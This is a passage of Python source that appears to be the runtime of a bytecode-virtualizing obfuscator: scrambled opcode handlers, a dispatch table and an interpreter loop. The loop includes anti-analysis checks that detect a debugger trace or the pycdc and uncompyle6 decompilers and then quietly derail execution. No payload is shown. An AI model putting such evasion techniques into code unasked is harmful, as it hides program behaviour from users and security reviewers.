 try:
  stack.append(next(stack[-1]))
 except StopIteration:
  stack.pop(); frame[7] = (arg ^ 54881) + 73
def _xse47(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _njhve2f1 = stack.pop(); _r0gqlqeb = stack.pop(); stack.append(_r0gqlqeb + _njhve2f1)
def _xh94d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame[4][arg].val = stack.pop()
def _xue23(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 val = stack.pop()
 if val: frame[7] = (arg ^ 54881) + 73
def _dseff(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if frame is None: return None
 return (frame[7] - 73 ^ 54881 ^ 90) & 255
def _xad8d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _d, _b, _c = arg; registers[_d] = set((registers[_b + i] for i in range(_c)))
def _xq3f1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _isfsp8fs8 = names[arg]; _gc89nw67x6 = stack.pop(); delattr(_gc89nw67x6, _isfsp8fs8)
def _xr653(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 del registers[arg[0]][registers[arg[1]]]
def _xb1f2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = iter(registers[arg[1]])
def _xl2b9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if not stack.pop(): frame[7] = (arg ^ 54881) + 73
def _xj909(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame[7] = (arg ^ 54881) + 73
def _xj304(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]][registers[arg[1]]] = registers[arg[2]]
def _xo1e1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 pass
def _xxbba(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]].append(registers[arg[1]])
def _xq878(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 fastlocals[arg] = None
def _xj200(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _vf2b3ifntv = stack.pop(); _ncdaarwcx = stack.pop(); stack.append(_ncdaarwcx // _vf2b3ifntv)
def _xp740(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(fastlocals[arg[0]] + consts[arg[1]])
def _xl7f0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop()
 stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
def _xfe50(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame[8] = stack.pop(); return _RET_SIGNAL
def _xi9e8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _dst, _fn, _fl = arg; _args = registers[_fn + 1]; _kwargs = registers[_fn + 2] if _fl & 1 else {}
 registers[_dst] = registers[_fn](*_args, **_kwargs)
def _xc437(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = not registers[arg[1]]
def _xw47b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 locals_dict[names[arg]] = stack.pop()
def _xg1a8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _onm6hluyk5 = names[arg]
 if _onm6hluyk5 in globals_dict:
  del globals_dict[_onm6hluyk5]
 else:
  raise NameError(f"name '{_onm6hluyk5}' is not defined")
def _xs6c0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _ri4dbokt = names[arg]
 if _ri4dbokt in globals_dict:
  stack.append(globals_dict[_ri4dbokt])
 elif _ri4dbokt == 'super':
  def _q3iv8jfs(*args):
   if not args:
    if True and frame[12] and hasattr(frame[12], '__class_owner__') and frame[27]:
     return _builtins.super(frame[12].__class_owner__, frame[27][0])
   return _builtins.super(*args)
  stack.append(_q3iv8jfs)
 elif builtins_dict and _ri4dbokt in builtins_dict:
  stack.append(builtins_dict[_ri4dbokt])
 else:
  raise NameError(f"name '{_ri4dbokt}' is not defined")
def _xp438(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 setattr(registers[arg[0]], names[arg[1]], registers[arg[2]])
def _xd2d4(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] >> registers[arg[2]]
def _xe99e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left != right)
def _xdf89(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _h2xb0rulat = stack.pop(); locals_dict[names[arg]] = _h2xb0rulat
def _xge81(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] + registers[arg[2]]
def _xk975(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = fastlocals[arg[1]]
def _xk89a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 mod = stack.pop()
 if hasattr(mod, '__all__'):
  for k in mod.__all__: locals_dict[k] = getattr(mod, k)
 else:
  for k, v in mod.__dict__.items():
   if not k.startswith('_'): locals_dict[k] = v
def _xdfda(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = ~registers[arg[1]]
def _xe2f0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(getattr(fastlocals[arg[0]], names[arg[1]]))
def _dqfe1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if frame is None: return None
 return (frame[7] - 73 ^ 54881 ^ 90) & 255
def _xt26d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = frame[4][arg[1]].val
def _xye79(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _uyf2ee9m, _zpvlohph, _nymp8ssxy4 = arg; registers[_uyf2ee9m] = registers[_zpvlohph] + registers[_nymp8ssxy4]
_T3_c5bb = {52136: _xcee8, 54886: _xe99e, 51499: _xe2f0, 55022: _xfe50, 51694: _xi523, 54986: _xl7f0, 52061: _xw47b, 52107: _xdfda, 51521: _xs6c0, 51800: _xx4f7, 51409: _xad8d, 52183: _xi9e8, 51332: _xj909, 51465: _xu30e, 52160: _xd2d4, 54894: _xge81, 51339: _xzf6b, 51786: _xvf3e, 54923: _xg1a8, 51229: _xcac6, 52047: _xq3f1, 52027: _xye79, 51382: _xr653, 52041: _xj304, 51626: _xa496, 51630: _xy2db, 54831: _xga2f, 54920: _xt26d, 52152: _xl2b9, 51330: _xz648, 52174: _xj200, 54998: _xb1f2, 51230: _xr951, 51710: _xx899, 52034: _xdf89, 51526: _xxbba, 51207: _xk89a, 54889: _xy665, 51520: _xh94d, 55011: _xdc02, 51771: _xc437, 51527: _xye76, 51636: _xdeb0, 51970: _xl972, 51289: _xp438, 52019: _xcd4b, 52015: _xgd8b, 51219: _xk975, 51751: _xq878, 54902: _xse47, 51350: _xo508, 54884: _xof19, 51702: _xue23, 51450: _xp157, 51329: _xp740, 51583: _xo1e1}
_qn8tsqsgfa = None
def _oh0xfvl0(frame):
 global _qn8tsqsgfa; old_frame = _qn8tsqsgfa; _qn8tsqsgfa = frame; _xoqww833mq = []
 try:
  code = frame[31]; instructions = code.instructions; consts = code.consts; names = code.names
  stack = frame[2]; registers = frame[0]; fastlocals = frame[27]; globals_dict = frame[28]
  locals_dict = frame[10]; builtins_dict = globals_dict.get('__builtins__')
  if isinstance(builtins_dict, type(_sys)):
   builtins_dict = builtins_dict.__dict__
  elif hasattr(builtins_dict, '__dict__'):
   builtins_dict = builtins_dict.__dict__
  def _iz45wyq7j(new_f):
   nonlocal frame, code, instructions, consts, names, stack, registers, fastlocals, globals_dict, locals_dict, builtins_dict
   new_f[21] = frame[21]; new_f[25] = frame[25]; new_f[18] = frame[18]; new_f[1] = frame[1]
   _xoqww833mq.append(frame); frame = new_f; code = frame[31]; instructions = code.instructions
   consts = code.consts; names = code.names; stack = frame[2]; registers = frame[0]; fastlocals = frame[27]
   globals_dict = frame[28]; locals_dict = frame[10]; builtins_dict = globals_dict.get('__builtins__')
   if isinstance(builtins_dict, type(_sys)):
    builtins_dict = builtins_dict.__dict__
   elif hasattr(builtins_dict, '__dict__'):
    builtins_dict = builtins_dict.__dict__
   return True
  def _cal07gkgaj(val):
   nonlocal frame, code, instructions, consts, names, stack, registers, fastlocals, globals_dict, locals_dict, builtins_dict
   if _xoqww833mq:
    _ret_accum = frame[21]; frame = _xoqww833mq.pop(); frame[21] = (frame[21] ^ _ret_accum) & 4294967295
    code = frame[31]; instructions = code.instructions; consts = code.consts; names = code.names
    stack = frame[2]; registers = frame[0]; fastlocals = frame[27]; globals_dict = frame[28]
    locals_dict = frame[10]; builtins_dict = globals_dict.get('__builtins__')
    if isinstance(builtins_dict, type(_sys)):
     builtins_dict = builtins_dict.__dict__
    elif hasattr(builtins_dict, '__dict__'):
     builtins_dict = builtins_dict.__dict__
    stack.append(val); return True
   return False
  _m9rthn60h = 0
  while frame[7] - 73 ^ 54881 in instructions:
   opcode, arg = instructions[frame[7] - 73 ^ 54881]; frame[7] = ((frame[7] - 73 ^ 54881) + 5 ^ 54881) + 73
   _m9rthn60h += 1
   frame[26] = (frame[26] * 7482797 + opcode + (arg if isinstance(arg, int) else 0) ^ 162949437) & 4294967295
   if _m9rthn60h == 1 or _m9rthn60h & 7 == 0:
    frame[17] = frame[17] ^ (1979230377 if (frame[7] - 73 ^ 54881 ^ 54881) + 73 ^ frame[7] != 0 or (not hasattr(frame[2], '__len__') or not hasattr(frame[0], '__len__') or len(frame[0]) != 256) or getattr(_sys, 'gettrace', lambda: None)() is not None or (b'pycdc'.decode() in _sys.modules or b'uncompyle6'.decode() in _sys.modules) else 0)
    frame[19] = frame[19] ^ (1979230377 if (frame[7] - 73 ^ 54881 ^ 54881) + 73 ^ frame[7] != 0 or (not hasattr(frame[2], '__len__') or not hasattr(frame[0], '__len__') or len(frame[0]) != 256) or getattr(_sys, 'gettrace', lambda: None)() is not None or (b'pycdc'.decode() in _sys.modules or b'uncompyle6'.decode() in _sys.modules) else 0)
    if frame[17] != 0: frame[7] = ((frame[7] - 73 ^ 54881) + (frame[17] & 1) ^ 54881) + 73
   frame[21] = frame[21] * 31 + opcode & 4294967295; frame[21] = (frame[21] ^ frame[17]) & 4294967295
   try:
    if opcode < 2246:
     if opcode < 921:
      if opcode < 578:
       if opcode < 300:
        if opcode < 177:
         if opcode < 123:
          if opcode < 52:
           if opcode == 48: registers[arg[0]] = fastlocals[arg[1]]
          elif opcode == 52:
           registers[arg[0]] = consts[arg[1]]
          elif opcode == 56:
           right = stack.pop(); left = stack.pop(); stack.append(left * right)
         elif opcode < 165:
          if opcode == 123: stack.append(consts[arg])
         elif opcode == 165:
          name = names[arg]; obj = stack.pop(); val = stack.pop(); setattr(obj, name, val)
         elif opcode == 174:
          def _b1p4pekp5d(func, name, *bases, **kwds):
           meta = kwds.get('metaclass')
           if meta is None: meta = type(bases[0]) if bases else type
           ns = meta.__prepare__(name, bases, **kwds) if hasattr(meta, '__prepare__') else {}
           if hasattr(func, 'execute_with_locals'):
            func.execute_with_locals(ns)
           elif callable(func):
            func()
           cls = meta(name, bases, ns, **kwds)
           for item in ns.values():
            if hasattr(item, '__code__') or hasattr(item, '__class_owner__'): item.__class_owner__ = cls
           return cls
          registers[arg] = _b1p4pekp5d
        elif opcode < 241:
         if opcode < 185:
          if opcode == 177: registers[arg] = stack.pop()
         elif opcode == 185:
          stack[-1] = False if stack[-1] else True
         elif opcode == 208:
          stack += [fastlocals[arg]]
        elif opcode < 260:
         if opcode == 241:
          _fz7krwoy1l = [stack.pop() for _ in range(arg)][::-1] if arg > 0 else []; _nwq32qe2ww = stack.pop()
          if isinstance(_nwq32qe2ww, _types.MethodType) and isinstance(_nwq32qe2ww.__func__, _ez63j94b):
           _fz7krwoy1l = [_nwq32qe2ww.__self__] + list(_fz7krwoy1l); _nwq32qe2ww = _nwq32qe2ww.__func__
          if isinstance(_nwq32qe2ww, _ez63j94b):
           _ck4u5nng6 = _m75qhltb5c(_nwq32qe2ww.code, _fz7krwoy1l, {}, _nwq32qe2ww.defaults, _nwq32qe2ww.kw_defaults)
           frame[3] = _tivq01qx(_nwq32qe2ww.code, _nwq32qe2ww.globals_dict, fastlocals=_ck4u5nng6, closure=_nwq32qe2ww.closure, func=_nwq32qe2ww)
          else:
           stack.append(_nwq32qe2ww(*_fz7krwoy1l))
         elif opcode == 254:
          right = stack.pop(); left = stack.pop(); stack.append(left not in right)
        elif opcode == 260:
         _xe3p3x91 = names[arg]; _w6nz1ok9 = stack.pop(); globals_dict.__setitem__(_xe3p3x91, _w6nz1ok9)
        elif opcode == 281:
         if not registers[arg[0]]: frame[7] = (arg[1] ^ 54881) + 73
       elif opcode < 460:
        if opcode < 389:
         if opcode < 325:
          if opcode == 300:
           seq = list(stack.pop())
           if len(seq) != arg:
            raise ValueError(f'need more than {len(seq)} values to unpack (expected {arg})')
           for item in reversed(seq): stack.append(item)
         elif opcode == 325:
          _r = stack.pop(); stack[-1] = stack[-1] @ _r
         elif opcode == 347:
          _r = stack.pop(); stack[-1] = stack[-1] >> _r
        elif opcode < 425:
         if opcode == 389:
          _d, _s1, _s2 = arg; _a = registers[_s1]; _b = registers[_s2]
          registers[_d] = (_a & ~_b) - (~_a & _b) if type(_a) is int and type(_b) is int else _a - _b
         elif opcode == 418:
          _val = stack[-1]; del stack[-1]; _f5msg6h2 = _val
          if _cal07gkgaj(_f5msg6h2): continue
          return _f5msg6h2
        elif opcode == 425:
         _ri4dbokt = names[arg]; _u714ke3jx = globals_dict
         if _ri4dbokt in _u714ke3jx:
          _dsea4wn7q = _u714ke3jx[_ri4dbokt]; stack.append(_dsea4wn7q)
         elif _ri4dbokt == 'super':
          def _q3iv8jfs(*args):
           if not args:
            if True and frame[12] and hasattr(frame[12], '__class_owner__') and frame[27]:
             return _builtins.super(frame[12].__class_owner__, frame[27][0])
           return _builtins.super(*args)
          stack.append(_q3iv8jfs)
         elif builtins_dict and _ri4dbokt in builtins_dict:
          stack.append(builtins_dict[_ri4dbokt])
         else:
          raise NameError(f"name '{_ri4dbokt}' is not defined")
        elif opcode == 428:
         _d, _s1, _s2 = arg; registers[_d] = registers[_s1] // registers[_s2]
       elif opcode < 523:
        if opcode < 490:
         if opcode == 460:
          right = stack.pop(); left = stack.pop(); cmp_arg = arg; _zny82bcmpl = arg
          if _zny82bcmpl < 5:
           if _zny82bcmpl < 2:
            _glfmpmo9kw = left < right if _zny82bcmpl == 0 else left <= right
           elif _zny82bcmpl == 2:
            _glfmpmo9kw = left == right
           elif _zny82bcmpl == 3:
            _glfmpmo9kw = left != right
           else:
            _glfmpmo9kw = left > right
          elif _zny82bcmpl < 8:
           if _zny82bcmpl == 5:
            _glfmpmo9kw = left >= right
           elif _zny82bcmpl == 6:
            _glfmpmo9kw = left in right
           else:
            _glfmpmo9kw = left not in right
          elif _zny82bcmpl == 8:
           _glfmpmo9kw = left is right
          elif _zny82bcmpl == 9:
           _glfmpmo9kw = left is not right
          else:
           _glfmpmo9kw = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
          stack.append(_glfmpmo9kw)
        elif opcode == 490:
         pass
        elif opcode == 494:
         _r = stack.pop(); _l = stack[-1]
         stack[-1] = (_l | _r) + (_l & _r) if type(_l) is int and type(_r) is int else _l + _r
       elif opcode < 536:
        if opcode == 523:
         stack.append(fastlocals[arg[0]] - consts[arg[1]])
        elif opcode == 526:
         _dst, _src = arg; registers[_dst] = registers[_src]
       elif opcode == 536:
        _top = stack[-1]
        while len(fastlocals) <= arg: fastlocals.append(None)
        fastlocals[arg] = _top
       elif opcode == 567:
        if not stack[-1]: frame[7] = (arg ^ 54881) + 73
      elif opcode < 786:
       if opcode < 706:
        if opcode < 626:
         if opcode < 609:
          if opcode == 578: _d, _s1, _s2 = arg; registers[_d] = registers[_s1] | registers[_s2]
         elif opcode == 609:
          name_idx, argc = arg; name = names[name_idx]
          if name == 'super' and argc == 0:
           if True and frame[12] and hasattr(frame[12], '__class_owner__') and frame[27]:
            stack.append(_builtins.super(frame[12].__class_owner__, frame[27][0]))
           else:
            stack.append(_builtins.super())
          else:
           func = globals_dict.get(name) or (builtins_dict.get(name) if builtins_dict else getattr(_builtins, name, None))
           args = stack[-argc:] if argc > 0 else []
           if argc > 0: del stack[-argc:]
           if isinstance(func, _types.MethodType) and isinstance(func.__func__, _ez63j94b):
            args = [func.__self__] + list(args); func = func.__func__
           if isinstance(func, _ez63j94b):
            _fl = _m75qhltb5c(func.code, args, {}, func.defaults, func.kw_defaults)
            frame[3] = _tivq01qx(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
           else:
            stack.append(func(*args))
         elif opcode == 623:
          _dst, _idx = arg; registers[_dst] = consts[_idx]
        elif opcode < 637:
         if opcode == 626:
          _yy5y5xh1 = {}
          if arg > 0:
           _dt5z7iqn = [stack.pop() for _ in range(2 * arg)][::-1]
           for _ljz2b0ps in range(0, len(_dt5z7iqn), 2):
            _yy5y5xh1[_dt5z7iqn[_ljz2b0ps]] = _dt5z7iqn[_ljz2b0ps + 1]
          stack.append(_yy5y5xh1)
         elif opcode == 627:
          _dst, _nidx, _flreg = arg
          _nm = consts[_nidx] if isinstance(consts, (list, tuple)) and _nidx < len(consts) and isinstance(consts[_nidx], str) else names[_nidx]
          registers[_dst] = __import__(_nm, globals_dict, locals_dict, registers[_flreg], 0)
        elif opcode == 637:
         delattr(registers[arg[0]], names[arg[1]])
        elif opcode == 705:
         _ret = fastlocals[arg]; _f5msg6h2 = _ret
         if _cal07gkgaj(_f5msg6h2): continue
         return _f5msg6h2
       elif opcode < 757:
        if opcode < 740:
         if opcode == 706:
          _mod = registers[arg]
          if hasattr(_mod, '__all__'):
           for _k in _mod.__all__: locals_dict[_k] = getattr(_mod, _k)
          else:
           for _k, _v in _mod.__dict__.items():
            if not _k.startswith('_'): locals_dict[_k] = _v
        elif opcode == 740:
         stack[-2] = stack[-2] & stack[-1]; stack.pop()
        elif opcode == 741:
         val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].extend(val)
       elif opcode < 775:
        if opcode == 757:
         _h7odflyhd = stack.pop(); _tcwredolsu = stack.pop(); stack.append(_h7odflyhd)
         stack.append(_tcwredolsu)
        elif opcode == 769:
         if registers[arg[0]]: frame[7] = (arg[1] ^ 54881) + 73
       elif opcode == 775:
        _nidx, _src = arg; globals_dict[names[_nidx]] = registers[_src]
       elif opcode == 776:
        registers[arg] = stack.pop()
      elif opcode < 842:
       if opcode < 815:
        if opcode < 791:
         if opcode == 786: _njhve2f1 = stack.pop(); stack[-1] = stack[-1] + _njhve2f1
        elif opcode == 791:
         left = fastlocals[arg[0]]; right = consts[arg[1]]; cmp_arg = arg[2]; res = False
         if cmp_arg == 0:
          res = left < right
         elif cmp_arg == 1:
          res = left <= right
         elif cmp_arg == 2:
          res = left == right
         elif cmp_arg == 3:
          res = left != right
         elif cmp_arg == 4:
          res = left > right
         elif cmp_arg == 5:
          res = left >= right
         elif cmp_arg == 6:
          res = left in right
         elif cmp_arg == 7:
          res = left not in right
         elif cmp_arg == 8:
          res = left is right
         elif cmp_arg == 9:
          res = left is not right
         elif cmp_arg == 10:
          res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
         stack.append(res)
        elif opcode == 799:
         _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left in right)
       elif opcode < 826:
        if opcode == 815:
         _idx, _src = arg
         while len(fastlocals) <= _idx: fastlocals.append(None)
         fastlocals[_idx] = registers[_src]
        elif opcode == 820:
         if arg == 0:
          raise
         elif arg == 1:
          raise stack.pop()
         elif arg == 2:
          cause = stack.pop(); exc = stack.pop(); raise exc from cause
       elif opcode == 826:
        key = stack.pop(); obj = stack.pop(); del obj[key]
       elif opcode == 837:
        key = stack.pop(); obj = stack.pop(); stack.append(obj[key])
      elif opcode < 866:
       if opcode < 844:
        if opcode == 842:
         _val = registers[arg[1]]
         while len(fastlocals) <= arg[0]: fastlocals.append(None)
         fastlocals[arg[0]] = _val
       elif opcode == 844:
        _mr, _kr, _vr = arg; registers[_mr][registers[_kr]] = registers[_vr]
       elif opcode == 845:
        stack.append(registers[arg])
      elif opcode < 881:
       if opcode == 866:
        registers[arg[0]] = registers[arg[1]] * registers[arg[2]]
       elif opcode == 880:
        _mmpuuk6df = arg; frame[7] = (_mmpuuk6df ^ 54881) + 73
      elif opcode == 881:
       _km6x0q7v07 = names[arg]; _h2xb0rulat = stack.pop(); locals_dict.__setitem__(_km6x0q7v07, _h2xb0rulat)
      elif opcode == 893:
       frame[7] = ((arg if stack[-1] else frame[7] - 73 ^ 54881) ^ 54881) + 73
     elif opcode < 1344:
      if opcode < 1116:
       if opcode < 985:
        if opcode < 952:
         if opcode == 921:
          stack.append(fastlocals[arg[0]] + fastlocals[arg[1]])
         elif opcode == 947:
          _a = fastlocals[arg[0]]; _b = fastlocals[arg[1]]; stack.append(_a * _b)
        elif opcode == 952:
         stack[-2] = stack[-2] // stack[-1]; stack.pop()
        elif opcode == 960:
         _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left is not right)
       elif opcode < 1071:
        if opcode < 1043:
         if opcode == 985:
          registers[arg[0]].add(registers[arg[1]])
         elif opcode == 1003:
          right = stack.pop(); left = stack.pop(); stack.append(left == right)
        elif opcode == 1043:
         if frame[16] is not None: frame[16](None, None, None); frame[16] = None
        elif opcode == 1062:
         _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left < right)
       elif opcode < 1112:
        if opcode == 1071:
         _e4fgevvtlu = stack.pop(); _j8fihwq69 = stack.pop(); _fj48p19x = stack.pop()
         _j8fihwq69[_e4fgevvtlu] = _fj48p19x
        elif opcode == 1101:
         registers[arg] = stack.pop()
       elif opcode == 1112:
        val = stack.pop()
        if val: frame[7] = (arg ^ 54881) + 73
      elif opcode < 1227:
       if opcode < 1117:
        if opcode == 1116:
         _f5msg6h2 = registers[arg]
         if _cal07gkgaj(_f5msg6h2): continue
         return _f5msg6h2
       elif opcode < 1138:
        if opcode == 1117:
         _c, _r1, _r2 = arg
         if _c == 0:
          raise
         elif _c == 1:
          raise registers[_r1]
         elif _c == 2:
          raise registers[_r1] from registers[_r2]
       elif opcode == 1138:
        _tkwyten3, _w6nod5lln = stack[-2:]; del stack[-2:]; stack.append(_tkwyten3 << _w6nod5lln)
       elif opcode == 1217:
        _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left <= right)
      elif opcode < 1322:
       if opcode == 1227:
        _sba11dwza = stack.pop(); _v9a4ymze9 = names[arg]; stack.extend([getattr(_sba11dwza, _v9a4ymze9)])
      elif opcode == 1322:
       stack.extend([stack[-2], stack[-1]])
      elif opcode == 1343:
       right = stack.pop(); left = stack.pop(); cmp_arg = arg
       if arg == 0:
        stack.append(left < right)
       elif arg == 1:
        stack.append(left <= right)
       elif arg == 2:
        stack.append(left == right)
       elif arg == 3:
        stack.append(left != right)
       elif arg == 4:
        stack.append(left > right)
       elif arg == 5:
        stack.append(left >= right)
       elif arg == 6:
        stack.append(left in right)
       elif arg == 7:
        stack.append(left not in right)
       elif arg == 8:
        stack.append(left is right)
       elif arg == 9:
        stack.append(left is not right)
       elif arg == 10:
        stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
     elif opcode < 1769:
      if opcode < 1638:
       if opcode < 1517:
        if opcode < 1455:
         if opcode < 1371:
          if opcode == 1344:
           _b = stack.pop(); _a = stack.pop()
           _res = 2 * (_a & ~_b) - (_a ^ _b) if type(_a) is int and type(_b) is int else _a - _b
           stack.append(_res)
         elif opcode == 1371:
          val = stack.pop(); key = stack.pop(); depth = arg if arg is not None and arg > 0 else 1
          stack[-depth][key] = val
         elif opcode == 1398:
          _name = names[arg[1]]
          if _name in locals_dict:
           registers[arg[0]] = locals_dict[_name]
          elif _name in globals_dict:
           registers[arg[0]] = globals_dict[_name]
          elif _name == 'super':
           def _q3iv8jfs(*args):
            if not args:
             if True and frame[12] and hasattr(frame[12], '__class_owner__') and frame[27]:
              return _builtins.super(frame[12].__class_owner__, frame[27][0])
            return _builtins.super(*args)
           registers[arg[0]] = _q3iv8jfs
          elif builtins_dict and _name in builtins_dict:
           registers[arg[0]] = builtins_dict[_name]
          else:
           raise NameError(f"name '{_name}' is not defined")
        elif opcode < 1477:
         if opcode == 1455:
          _f5msg6h2 = stack.pop()
          if _cal07gkgaj(_f5msg6h2): continue
          return _f5msg6h2
        elif opcode < 1491:
         if opcode == 1477:
          _d, _s1, _s2 = arg; _a = registers[_s1]; _b = registers[_s2]
          registers[_d] = (_a | _b) + (_a & _b) if type(_a) is int and type(_b) is int else _a + _b
        elif opcode < 1502:
         if opcode == 1491:
          registers[arg[0]] = registers[arg[1]](*[registers[arg[1] + 1 + i] for i in range(arg[2])])
         elif opcode == 1500:
          _val = registers[arg]; stack.append(_val)
        elif opcode == 1502:
         _r = stack.pop(); stack[-1] = stack[-1] / _r
       elif opcode < 1607:
        if opcode < 1521:
         if opcode == 1517:
          const_idx, var_idx = arg
          while len(fastlocals) <= var_idx: fastlocals.append(None)
          fastlocals[var_idx] = consts[const_idx]
        elif opcode == 1521:
         registers[arg[0]] = registers[arg[1]] ** registers[arg[2]]
        elif opcode == 1546:
         _c = frame[4][arg]; stack.append(_c.val)
       elif opcode == 1607:
        _xe3p3x91 = names[arg]; _w6nz1ok9 = stack.pop(); globals_dict.__setitem__(_xe3p3x91, _w6nz1ok9)
       elif opcode == 1632:
        del stack[len(stack) - 1]
      elif opcode < 1653:
       if opcode == 1638:
        _val = stack.pop(); globals_dict[names[arg]] = _val
       elif opcode == 1640:
        _val = stack.pop()
        if arg >= len(fastlocals): fastlocals.extend([None] * (arg - len(fastlocals) + 1))
        fastlocals[arg] = _val
      elif opcode < 1660:
       if opcode < 1659:
        if opcode == 1653:
         stack[-2] = stack[-2] ** stack[-1]; stack.pop()
        elif opcode == 1656:
         while len(fastlocals) <= arg[1]: fastlocals.append(None)
         fastlocals[arg[1]] = fastlocals[arg[0]]
       elif opcode == 1659:
        frame[7] = ((frame[7] - 73 ^ 54881) + (arg - (frame[7] - 73 ^ 54881)) ^ 54881) + 73
      elif opcode < 1692:
       if opcode == 1660:
        _seq = list(registers[arg[0]]); _c = arg[2]
        for i in range(_c): registers[arg[1] + _c - 1 - i] = _seq[i]
      elif opcode < 1758:
       if opcode == 1692:
        _dst, _fn, _argc = arg; _k = registers[_fn + 1 + _argc]; _kc = len(_k); _pc = _argc - _kc
        _pargs = [registers[_fn + 1 + i] for i in range(_pc)]
        _kvals = [registers[_fn + 1 + _pc + i] for i in range(_kc)]
        _dk = tuple((bytes((x ^ k[0] for x in k[1])).decode('utf-8') if isinstance(k, list) else k for k in _k))
        _kw = dict(zip(_dk, _kvals)); registers[_dst] = registers[_fn](*_pargs, **_kw)
       elif opcode == 1740:
        _l5y4w6v8 = stack.pop(); stack[-1] = stack[-1] - _l5y4w6v8
      elif opcode == 1758:
       registers[arg[0]] = consts[arg[1]]
     elif opcode < 1796:
      if opcode < 1790:
       if opcode == 1769:
        cmp_arg, target_pc = arg; right = stack.pop(); left = stack.pop(); res = False
        if cmp_arg == 0:
         res = left < right
        elif cmp_arg == 1:
         res = left <= right
        elif cmp_arg == 2:
         res = left == right
        elif cmp_arg == 3:
         res = left != right
        elif cmp_arg == 4:
         res = left > right
        elif cmp_arg == 5:
         res = left >= right
        elif cmp_arg == 6:
         res = left in right
        elif cmp_arg == 7:
         res = left not in right
        elif cmp_arg == 8:
         res = left is right
        elif cmp_arg == 9:
         res = left is not right
        elif cmp_arg == 10:
         res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
        if not res: frame[7] = (target_pc ^ 54881) + 73
       elif opcode == 1778:
        stack += [consts[arg]]
      elif opcode == 1790:
       stack[-2] = stack[-2] << stack[-1]; stack.pop()
      elif opcode == 1793:
       if frame[5]:
        _b = frame[5].pop()
        if _b.type == _dp6t2dmof.WITH: frame[16] = _b.exit_fn
     elif opcode < 2074:
      if opcode < 1846:
       if opcode == 1796:
        _il1w1udgh = stack.pop(); _lr64e2y4 = stack.pop()
        frame[19] = (frame[19] * 1103515245 + 12345 ^ (_lr64e2y4 if type(_lr64e2y4) is int else 0)) & 4294967295
        _tf1oddat = (_lr64e2y4 | _il1w1udgh) - (_lr64e2y4 & _il1w1udgh) if type(_lr64e2y4) is int and type(_il1w1udgh) is int else _lr64e2y4 ^ _il1w1udgh
        stack.append(_tf1oddat)
      elif opcode < 1999:
       if opcode == 1846:
        _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left is right)
       elif opcode == 1926:
        right = stack.pop(); left = stack.pop(); stack.append(left ^ right)
      elif opcode == 1999:
       _n = names[arg]
       if _n in locals_dict:
        del locals_dict[_n]
       elif _n in globals_dict:
        del globals_dict[_n]
       else:
        raise NameError(f"name '{_n}' is not defined")
